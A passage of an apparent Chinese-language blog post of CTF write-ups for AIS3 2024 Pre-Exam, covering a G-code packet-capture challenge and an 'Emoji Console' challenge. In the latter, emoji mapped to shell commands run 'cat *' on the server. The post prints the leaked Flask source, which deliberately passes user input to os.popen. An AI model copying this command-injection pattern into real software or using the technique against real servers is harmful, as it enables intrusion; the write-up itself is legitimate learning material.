@@ -1,0 +1,1000 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='AIS3 2024 Pre - Exam Writes up'><title>AIS3 2024 Pre - Exam Writes up</title>
+<link rel=canonical href=https://dkri3c1.github.io/p/ais3-2024-pre-exam-writes-up/><link rel=stylesheet href=/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css><meta property='og:title' content='AIS3 2024 Pre - Exam Writes up'><meta property='og:description' content='AIS3 2024 Pre - Exam Writes up'><meta property='og:url' content='https://dkri3c1.github.io/p/ais3-2024-pre-exam-writes-up/'><meta property='og:site_name' content="dkri3c1's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:published_time' content='2024-05-30T00:00:00+00:00'><meta property='article:modified_time' content='2024-05-30T00:00:00+00:00'><meta property='og:image' content='https://dkri3c1.github.io/p/ais3-2024-pre-exam-writes-up/cover.png'><meta name=twitter:title content="AIS3 2024 Pre - Exam Writes up"><meta name=twitter:description content="AIS3 2024 Pre - Exam Writes up"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://dkri3c1.github.io/p/ais3-2024-pre-exam-writes-up/cover.png'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu0fd796befda1b1bce6509fce4d514560_19902_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🐱</span></figure><div class=site-meta><h1 class=site-name><a href=/>dkri3c1's Blog</a></h1><h2 class=site-description>一個對於資安充滿興趣的屁孩</h2></div></header><ol class=social-menu><li><a href=https://github.com/dkri3c1 target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href='https://www.instagram.com/dkri3c1?igsh=aWZnYzB1ZXJ6M3di&amp;utm_source=qr' target=_blank title=Instagram rel=me><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50" height="50"><path d="M16 3C8.8324839 3 3 8.8324839 3 16V34c0 7.167516 5.8324839 13 13 13H34c7.167516.0 13-5.832484 13-13V16C47 8.8324839 41.167516 3 34 3H16zm0 2H34c6.086484.0 11 4.9135161 11 11V34c0 6.086484-4.913516 11-11 11H16C9.9135161 45 5 40.086484 5 34V16C5 9.9135161 9.9135161 5 16 5zm21 6a2 2 0 00-2 2 2 2 0 002 2 2 2 0 002-2 2 2 0 00-2-2zM25 14c-6.063288.0-11 4.936712-11 11s4.936712 11 11 11 11-4.936712 11-11-4.936712-11-11-11zm0 2c4.982407.0 9 4.017593 9 9s-4.017593 9-9 9-9-4.017593-9-9 4.017593-9 9-9z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><!doctype html><svg height="800" width="800" id="_x32_" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="-51.2 -51.2 614.4 614.4" fill="#000"><g id="SVGRepo_bgCarrier" stroke-width="0"/><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#000" stroke-width="30.72"><style>.st0{fill:#fff}</style><g><path class="st0" d="M458.159 404.216c-18.93-33.65-49.934-71.764-100.409-93.431-28.868 20.196-63.938 32.087-101.745 32.087-37.828.0-72.898-11.89-101.767-32.087-50.474 21.667-81.479 59.782-100.398 93.431C28.731 448.848 48.417 512 91.842 512c43.426.0 164.164.0 164.164.0s120.726.0 164.153.0c43.424.0 63.11-63.152 38-107.784z"/><path class="st0" d="M256.005 300.641c74.144.0 134.231-60.108 134.231-134.242v-32.158C390.236 60.108 330.149.0 256.005.0 181.85.0 121.753 60.108 121.753 134.242V166.4C121.753 240.533 181.851 300.641 256.005 300.641z"/></g></g><g id="SVGRepo_iconCarrier"><style>.st0{fill:#fff}</style><g><path class="st0" d="M458.159 404.216c-18.93-33.65-49.934-71.764-100.409-93.431-28.868 20.196-63.938 32.087-101.745 32.087-37.828.0-72.898-11.89-101.767-32.087-50.474 21.667-81.479 59.782-100.398 93.431C28.731 448.848 48.417 512 91.842 512c43.426.0 164.164.0 164.164.0s120.726.0 164.153.0c43.424.0 63.11-63.152 38-107.784z"/><path class="st0" d="M256.005 300.641c74.144.0 134.231-60.108 134.231-134.242v-32.158C390.236 60.108 330.149.0 256.005.0 181.85.0 121.753 60.108 121.753 134.242V166.4C121.753 240.533 181.851 300.641 256.005 300.641z"/></g></g></svg>
+<span>About</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg>
+<select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://dkri3c1.github.io/ selected></option></select></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><ol><li><a href=#前言>前言</a></li></ol></li><li><a href=#misc>Misc</a><ol><li><a href=#welcome>welcome</a></li><li><a href=#three-dimensional-secret>Three Dimensional Secret</a></li><li><a href=#emoji-console>Emoji Console</a></li></ol></li><li><a href=#crypto>Crypto</a><ol><li><a href=#babyrsa>babyRSA</a></li></ol></li><li><a href=#web>Web</a><ol><li><a href=#evil-calculator>Evil Calculator</a></li></ol></li><li><a href=#reverse>Reverse</a><ol><li><a href=#the-long-print>The Long Print</a></li></ol></li><li><a href=#pwn>pwn</a><ol><li><a href=#mathter>mathter</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/ais3-2024-pre-exam-writes-up/><img src=/p/ais3-2024-pre-exam-writes-up/cover_hueb49e33ea8fd26811b8fa2d193f7d4e2_58807_800x0_resize_box_3.png srcset="/p/ais3-2024-pre-exam-writes-up/cover_hueb49e33ea8fd26811b8fa2d193f7d4e2_58807_800x0_resize_box_3.png 800w, /p/ais3-2024-pre-exam-writes-up/cover_hueb49e33ea8fd26811b8fa2d193f7d4e2_58807_1600x0_resize_box_3.png 1600w" width=800 height=799 loading=lazy alt="Featured image of post AIS3 2024 Pre - Exam Writes up"></a></div><div class=article-details><header class=article-category><a href=/categories/ctf/ style=background-color:#d9006c;color:#fff>CTF</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/ais3-2024-pre-exam-writes-up/>AIS3 2024 Pre - Exam Writes up</a></h2><h3 class=article-subtitle>AIS3 2024 Pre - Exam Writes up</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>May 30, 2024</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>11 minute read</time></div></footer></div></header><section class=article-content><h3 id=前言>前言</h3><p>從去年的150多名到今天的45名，中間經過了無數次的挫折，終於在資安上面有一點起色了，但進步的空間還是很大，期許自己明年可以打到前30名吧www</p><p><img src=https://hackmd.io/_uploads/Hy--220L0.png loading=lazy alt=image></p><h2 id=misc>Misc</h2><h3 id=welcome>welcome</h3><p>flag就在上面owob</p><p><img src=https://hackmd.io/_uploads/SJ7-841EC.png loading=lazy alt=image></p><p>flag: AIS3{Welc0me_to_AIS3_PreExam_2o24!}</p><h3 id=three-dimensional-secret>Three Dimensional Secret</h3><p>之前打 picoCTF 好像有看過這種題型</p><p>wireshark 直接開啟之後 隨便點一個 TCP 封包來看</p><p><img src=https://hackmd.io/_uploads/rJWc8Nk40.png loading=lazy alt=image></p><p>這東西是 G-CODE (我也不知道他是拿來幹嘛的)</p><p>把封包內容丟到 <a class=link href=https://ncviewer.com/ target=_blank rel=noopener>https://ncviewer.com/</a> 就有 Flag ㄌ</p><p><img src=https://hackmd.io/_uploads/rkolvVkNC.png loading=lazy alt=image></p><p>flag: AIS3{b4d1y_tun3d_PriN73r}</p><h3 id=emoji-console>Emoji Console</h3><p>點進去題目發現很多 emoji，看到右邊的 ⭐ = * 及 🐍 = python</p><p><img src=https://hackmd.io/_uploads/By13p_JNA.png loading=lazy alt=image></p><p>然後試著 🐍 ⭐ 看看有啥線索</p><p><img src=https://hackmd.io/_uploads/BJ1-0OkN0.png loading=lazy alt=image></p><p>會發現我們執行了 app.py</p><p>卡了很久之後亂點發現 🐱 = cat</p><p>所以直接 🐱 ⭐ 看可不可以 leak 出什麼東西</p><p><img src=https://hackmd.io/_uploads/B14vCOJN0.png loading=lazy alt=image></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span><span class=lnt>202
+</span><span class=lnt>203
+</span><span class=lnt>204
+</span><span class=lnt>205
+</span><span class=lnt>206
+</span><span class=lnt>207
+</span><span class=lnt>208
+</span><span class=lnt>209
+</span><span class=lnt>210
+</span><span class=lnt>211
+</span><span class=lnt>212
+</span><span class=lnt>213
+</span><span class=lnt>214
+</span><span class=lnt>215
+</span><span class=lnt>216
+</span><span class=lnt>217
+</span><span class=lnt>218
+</span><span class=lnt>219
+</span><span class=lnt>220
+</span><span class=lnt>221
+</span><span class=lnt>222
+</span><span class=lnt>223
+</span><span class=lnt>224
+</span><span class=lnt>225
+</span><span class=lnt>226
+</span><span class=lnt>227
+</span><span class=lnt>228
+</span><span class=lnt>229
+</span><span class=lnt>230
+</span><span class=lnt>231
+</span><span class=lnt>232
+</span><span class=lnt>233
+</span><span class=lnt>234
+</span><span class=lnt>235
+</span><span class=lnt>236
+</span><span class=lnt>237
+</span><span class=lnt>238
+</span><span class=lnt>239
+</span><span class=lnt>240
+</span><span class=lnt>241
+</span><span class=lnt>242
+</span><span class=lnt>243
+</span><span class=lnt>244
+</span><span class=lnt>245
+</span><span class=lnt>246
+</span><span class=lnt>247
+</span><span class=lnt>248
+</span><span class=lnt>249
+</span><span class=lnt>250
+</span><span class=lnt>251
+</span><span class=lnt>252
+</span><span class=lnt>253
+</span><span class=lnt>254
+</span><span class=lnt>255
+</span><span class=lnt>256
+</span><span class=lnt>257
+</span><span class=lnt>258
+</span><span class=lnt>259
+</span><span class=lnt>260
+</span><span class=lnt>261
+</span><span class=lnt>262
+</span><span class=lnt>263
+</span><span class=lnt>264
+</span><span class=lnt>265
+</span><span class=lnt>266
+</span><span class=lnt>267
+</span><span class=lnt>268
+</span><span class=lnt>269
+</span><span class=lnt>270
+</span><span class=lnt>271
+</span><span class=lnt>272
+</span><span class=lnt>273
+</span><span class=lnt>274
+</span><span class=lnt>275
+</span><span class=lnt>276
+</span><span class=lnt>277
+</span><span class=lnt>278
+</span><span class=lnt>279
+</span><span class=lnt>280
+</span><span class=lnt>281
+</span><span class=lnt>282
+</span><span class=lnt>283
+</span><span class=lnt>284
+</span><span class=lnt>285
+</span><span class=lnt>286
+</span><span class=lnt>287
+</span><span class=lnt>288
+</span><span class=lnt>289
+</span><span class=lnt>290
+</span><span class=lnt>291
+</span><span class=lnt>292
+</span><span class=lnt>293
+</span><span class=lnt>294
+</span><span class=lnt>295
+</span><span class=lnt>296
+</span><span class=lnt>297
+</span><span class=lnt>298
+</span><span class=lnt>299
+</span><span class=lnt>300
+</span><span class=lnt>301
+</span><span class=lnt>302
+</span><span class=lnt>303
+</span><span class=lnt>304
+</span><span class=lnt>305
+</span><span class=lnt>306
+</span><span class=lnt>307
+</span><span class=lnt>308
+</span><span class=lnt>309
+</span><span class=lnt>310
+</span><span class=lnt>311
+</span><span class=lnt>312
+</span><span class=lnt>313
+</span><span class=lnt>314
+</span><span class=lnt>315
+</span><span class=lnt>316
+</span><span class=lnt>317
+</span><span class=lnt>318
+</span><span class=lnt>319
+</span><span class=lnt>320
+</span><span class=lnt>321
+</span><span class=lnt>322
+</span><span class=lnt>323
+</span><span class=lnt>324
+</span><span class=lnt>325
+</span><span class=lnt>326
+</span><span class=lnt>327
+</span><span class=lnt>328
+</span><span class=lnt>329
+</span><span class=lnt>330
+</span><span class=lnt>331
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1>#!/usr/local/bin/python3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>os</span>
+</span></span><span class=line><span class=cl><span class=n>from</span> <span class=n>flask</span> <span class=n>import</span> <span class=n>Flask</span><span class=p>,</span><span class=n>send_file</span><span class=p>,</span><span class=n>request</span><span class=p>,</span><span class=n>redirect</span><span class=p>,</span><span class=n>jsonify</span><span class=p>,</span><span class=n>render_template</span>
+</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>json</span>
+</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>string</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>translate</span><span class=p>(</span><span class=n>command</span><span class=p>:</span><span class=nb>str</span><span class=p>)</span><span class=o>-&gt;</span><span class=nb>str</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>emoji_table</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>load</span><span class=p>(</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;emoji.json&#39;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>,</span><span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>key</span> <span class=ow>in</span> <span class=n>emoji_table</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>key</span> <span class=ow>in</span> <span class=n>command</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>command</span> <span class=o>=</span> <span class=n>command</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=n>emoji_table</span><span class=p>[</span><span class=n>key</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>command</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=n>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/api&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>api</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>command</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;command&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>len</span><span class=p>(</span><span class=n>set</span><span class=p>(</span><span class=n>command</span><span class=p>)</span><span class=o>.</span><span class=n>intersection</span><span class=p>(</span><span class=n>set</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>printable</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34; &#34;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>))))</span><span class=o>&gt;</span><span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;command&#39;</span><span class=p>:</span><span class=n>command</span><span class=p>,</span><span class=s1>&#39;result&#39;</span><span class=p>:</span><span class=s1>&#39;Invalid command&#39;</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=n>command</span> <span class=o>=</span> <span class=n>translate</span><span class=p>(</span><span class=n>command</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=n>command</span><span class=o>+</span><span class=s2>&#34; 2&gt;&amp;1&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;command&#39;</span><span class=p>:</span><span class=n>command</span><span class=p>,</span><span class=s1>&#39;result&#39;</span><span class=p>:</span><span class=n>result</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span><span class=mi>5000</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😀&#34;</span><span class=p>:</span> <span class=s2>&#34;:D&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😁&#34;</span><span class=p>:</span> <span class=s2>&#34;:D&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😂&#34;</span><span class=p>:</span> <span class=s2>&#34;:&#39;)&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤣&#34;</span><span class=p>:</span> <span class=s2>&#34;XD&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😃&#34;</span><span class=p>:</span> <span class=s2>&#34;:D&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😄&#34;</span><span class=p>:</span> <span class=s2>&#34;:D&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😅&#34;</span><span class=p>:</span> <span class=s2>&#34;&#39;:D&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😆&#34;</span><span class=p>:</span> <span class=s2>&#34;XD&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😉&#34;</span><span class=p>:</span> <span class=s2>&#34;;)&#34;</span><span class=p>,</span>
